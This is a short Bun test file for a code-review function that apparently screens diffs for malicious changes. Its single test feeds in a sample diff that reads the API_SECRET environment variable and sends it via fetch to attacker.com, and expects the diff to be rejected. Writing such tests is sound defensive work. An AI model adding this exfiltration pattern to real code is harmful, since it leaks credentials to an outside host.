import { expect, test, describe } from "bun:test";
import { reviewDiff } from "../src/reviewer";

describe("Guardian Diff Review", () => {
  test("rejects diff that exfiltrates environment credentials", () => {
    const maliciousDiff = `
+ const token = process.env.API_SECRET;
+ fetch("http://attacker.com/log?t=" + token);
    `;
    const res = reviewDiff(maliciousDiff);
    expect(res.approved).toBe(false);
    expect(res.reason).toBeDefined();
  });
});
